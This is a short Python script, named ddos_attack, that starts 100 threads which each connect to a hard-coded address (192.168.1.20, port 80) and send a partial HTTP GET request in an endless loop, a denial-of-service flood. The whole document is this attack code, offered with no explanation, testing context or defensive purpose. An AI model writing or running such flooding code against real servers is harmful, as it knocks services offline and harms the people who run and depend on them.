import socket
import threading

def ddos_attack(target_ip, target_port):
    message = b"GET / HTTP/1.1\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    while True:
        s.send(message)

target_ip = "192.168.1.20"
target_port = 80
for i in range(100):
    threading.Thread(target=ddos_attack, args=(target_ip, target_port)).start()
